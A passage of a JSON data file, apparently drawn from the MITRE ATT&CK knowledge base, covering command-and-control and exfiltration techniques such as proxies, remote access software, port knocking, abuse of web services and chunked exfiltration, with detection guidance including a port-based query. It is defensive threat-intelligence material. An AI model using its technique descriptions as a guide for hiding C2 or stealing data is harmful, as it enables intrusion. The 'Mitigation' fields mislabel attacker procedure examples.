        "name": "PoshC2",
        "description": "PoshC2 contains modules that allow for use of proxies in command and control.[39]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can communicate over a reverse proxy using SOCKS5.[40][41]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality.[42]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.[43]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.[44]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2.[45]"
      },
      {
        "id": "S0273",
        "name": "Socksbot",
        "description": "Socksbot can start SOCKS proxy threads.[46]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has the ability to use an embedded SOCKS proxy in C2 communications.[47]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to proxy communications with command and control (C2) servers.[48]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla RPC backdoors have included local UPnP RPC proxies.[49]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "A TYPEFRAME variant can force the compromised system to function as a proxy server.[50]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used a peer-to-peer (P2P) network for C2.[51][52]"
      },
      {
        "id": "S0207",
        "name": "Vasport",
        "description": "Vasport is capable of tunneling though a proxy.[53]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has used compromised devices and customized versions of open source tools  such as Fast Reverse Proxy (FRP), Earthworm, and Impacket to proxy network traffic.[54][55]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT has the capability to act as a reverse proxy.[56]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure.[57]"
      },
      {
        "id": "S0117",
        "name": "XTunnel",
        "description": "XTunnel relays traffic between a C2 server and a victim.[58]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can set up an HTTP or SOCKS proxy.[2][59]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1090.001",
        "name": "Internal Proxy"
      },
      {
        "id": "T1090.002",
        "name": "External Proxy"
      },
      {
        "id": "T1090.003",
        "name": "Multi-hop Proxy"
      },
      {
        "id": "T1090.004",
        "name": "Domain Fronting"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Remote Access Software",
    "Code": "T1219",
    "Description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.[1][2][3]Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service).",
    "Mitigation": [
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network.[4]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used AnyDesk to transfer tools between systems.[5][6]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.[7]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak has a plugin for VNC and Ammyy Admin Tool.[8]"
      },
      {
        "id": "G0008",
        "name": "Carbanak",
        "description": "Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.[9]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.[10][11][12]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used DameWare Mini Remote Control for lateral movement.[13]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex contains a module for VNC.[14]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has checked for the LogMein event log in an attempt to encrypt files in remote machines.[15]"
      },
      {
        "id": "G0120",
        "name": "Evilnum",
        "description": "EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.[16]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has utilized the remote management tool Atera to download malware to a compromised system.[17]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil.[18]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has established tmate sessions for C2 communications.[19]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used a modified TeamViewer client as a command and control channel.[20][21]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally.[22][23]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has installed TeamViewer on targeted systems.[24]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels.[25]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM has the capability to download a VNC module from command and control (C2).[26]"
      },
      {
        "id": "G0048",
        "name": "RTM",
        "description": "RTM has used a modified version of TeamViewer and Remote Utilities for remote access.[27]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.[28][29]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has established tmate sessions for C2 communications.[19][30]"
      },
      {
        "id": "G0076",
        "name": "Thrip",
        "description": "Thrip used a cloud-based remote access software called LogMeIn for their attacks.[31]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot uses vncDll module to remote control the victim machine.[32][33]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.Analytic 1 - Suspicious Port Usagesuspicious_ports = filter network_traffic where ((protocol =\"6\" and (serverPort = 5938 or serverPort = 6568 or serverPort = 5650 or serverPort = 5655 or serverPort =5631)) or (protocol = \"17\" and (serverPort = 15000 and serverPort = 5632 )) or(httpHost = \"remoteutilities.com\"))"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for applications and processes related to remote admin software. Correlate activity with other suspicious behavior that may reduce false positives if this type of software is used by legitimate users and administrators. Domain Fronting may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote software to compromised systems. It may be possible to detect or prevent the installation of this type of software with host-based solutions."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Traffic Signaling",
    "Code": "T1205",
    "Description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "Mitigation": [
      {
        "id": "S0220",
        "name": "Chaos",
        "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[7]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port.[8][9]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.[10]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.[11][12]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.[5]"
      },
      {
        "id": "S0519",
        "name": "SYNful Knock",
        "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.[3]"
      },
      {
        "id": "S0221",
        "name": "Umbreon",
        "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.[13]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.[14]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze network packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, protocol port mismatch, anomalous syntax, or structure). Consider packet inspection for Wake-on-LAN magic packet consists of 6 bytes of FF followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.[16]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.[17]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, CommandandControl"
  },
  {
    "Title": "Web Service",
    "Code": "T1102",
    "Description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.[1]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can be utilized to abuse sslip.io, a free IP to domain mapping service, as part of actor-controlled C2 channels.[2]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar downloads have been hosted on Google Docs.[3][4]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can download files from Dropbox using a hardcoded access token.[5]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.[6]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee has been downloaded to victim's machines from OneDrive.[7]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 used the Cloudflare services for C2 communications.[8]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee.[9]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon can use Pastebin to receive C2 commands.[10]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can download additional modules from actor-controlled Amazon S3 buckets.[11]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can retrieve its primary payload from public sites such as Pastebin and Textbin.[12]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has used the dogechain.info API to generate a C2 address.[13]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.[14][15]"
      },
      {
        "id": "G1003",
        "name": "Ember Bear",
        "description": "Ember Bear has used Discord's content delivery network (CDN) to deliver malware and malicious scripts to a compromised host.[16]"
      },
      {
        "id": "G1011",
        "name": "EXOTIC LILY",
        "description": "EXOTIC LILY has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.[17]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used Pastebin and Google Storage to host content for their operations.[18]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used sslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.[19]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used Amazon Web Services to host C2.[20]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.[21]"
      },
      {
        "id": "S0561",
        "name": "GuLoader",
        "description": "GuLoader has the ability to download malware from Google Drive.[22]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has downloaded scripts from GitHub.[23]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.[24][25]"
      },
      {
        "id": "G0140",
        "name": "LazyScripter",
        "description": "LazyScripter has used GitHub to host its payloads to operate spam campaigns.[26]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used DropBox URLs to deliver variants of PlugX.[27]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE has used web services including Paste.ee to host payloads.[28]"
      },
      {
        "id": "S0508",
        "name": "ngrok",
        "description": "ngrok has been used by threat actors to proxy C2 connections to ngrok service subdomains.[29]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "During Operation Spalax, the threat actors used OneDrive and MediaFire to host payloads.[30]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has used Pastebin, Gitee, and GitLab for Command and Control.[31][32]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage has used a legitimate web service for evading detection.[14]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot has used a legitimate compromised website to download DLLs to the victim's machine.[33]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has used Google Drive and Dropbox to host files downloaded by victims via malicious links.[34]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 can download additional payloads from web services including Pastebin and top4top.[35]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has leveraged iplogger.org to send collected data back to C2.[36][37]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.[10][38]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can download additional payloads hosted on a Discord channel.[39][40][41][42][43]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1102.001",
        "name": "Dead Drop Resolver"
      },
      {
        "id": "T1102.002",
        "name": "Bidirectional Communication"
      },
      {
        "id": "T1102.003",
        "name": "One-Way Communication"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Automated Exfiltration",
    "Code": "T1020",
    "Description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
    "Mitigation": [
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.[1]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke exfiltrates collected files automatically over FTP to remote servers.[2]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch has automatically exfiltrated stolen files to Dropbox.[3]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.[4]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can automatically exfiltrate gathered SSH credentials.[5]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire has the ability to automatically send collected data back to the threat actors' C2.[6]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2.[6]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has used modules that automatically upload gathered documents to the C2 server.[7]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has performed  frequent and scheduled data exfiltration from compromised networks.[8]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron can be configured to automatically exfiltrate files under a specified directory.[9]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete’s collected files are exfiltrated automatically to remote servers.[10]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can automatically upload collected files to its C2 server.[11]"
      },
      {
        "id": "S0643",
        "name": "Peppy",
        "description": "Peppy has the ability to automatically exfiltrate files and keylogs.[12]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.[13]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter sent collected system and network information compiled into a report to an adversary-controlled C2.[14]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has configured tools to automatically send collected files to attacker controlled servers.[15]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can automatically exfiltrate collected documents to the C2 server.[16][17]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to manage an automated queue of egress files and commands sent to its C2.[18]"
      },
      {
        "id": "S0131",
        "name": "TINYTYPHON",
        "description": "When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server.[19]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.[20]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine. [21]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for abnormal access to files (i.e. .pdf, .docx, .jpg, etc.), especially sensitive documents, through the use of automated processing after being gathered during Collection."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections associated with processes performing collection activity, especially those involving abnormal/untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor network traffic content for evidence of data exfiltration, such as gratuitous or anomalous outbound traffic containing collected data. Consider correlation with process monitoring and command lines associated with collection and exfiltration."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpected hardware devices, or other uncommon data flows."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1020.001",
        "name": "Traffic Duplication"
      }
    ],
    "Tactic": "\nExfiltration"
  },
  {
    "Title": "Data Transfer Size Limits",
    "Code": "T1030",
    "Description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has divided files if the size is 0x1000000 bytes or more.[1]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has split archived exfiltration files into chunks smaller than 1MB.[2]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration.[3]"
      },
      {
        "id": "C0026",
        "name": "C0026",
        "description": "During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.[4]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .[5]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike will break large data sets into smaller chunks for exfiltration.[6]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.[7]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.[8]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can exfiltrate data to the C2 server in 27-character chunks.[9]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has split archived files into multiple parts to bypass a 5MB limit.[10]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic supports custom chunk sizes used to upload/download files.[11]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.[12]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.[13]"
      },
      {
        "id": "S0150",
        "name": "POSHSPY",
        "description": "POSHSPY uploads data in 2048-byte chunks.[14]"
      },
      {
        "id": "S1040",
        "name": "Rclone",
        "description": "The Rclone \"chunker\" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.[15][3]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.[16]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors have split RAR files for exfiltration into parts.[17]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts or uncommon data flows (e.g. unusual network communications or suspicious communications sending fixed size data packets at regular intervals as well as unusually long connection patterns). Consider analyzing packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, protocol port mismatch, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments (e.g. monitor anomalies in use of files that do not normally initiate network connections or unusual connections initiated"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      }
    ],
    "Subtechniques": "\nExfiltration"
  },
  {
    "Title": "Exfiltration Over Alternative Protocol",
    "Code": "T1048",
    "Description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP.[1] On macOS and Linux curl may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.[2]Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can directly download cloud user data such as OneDrive files.[3]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
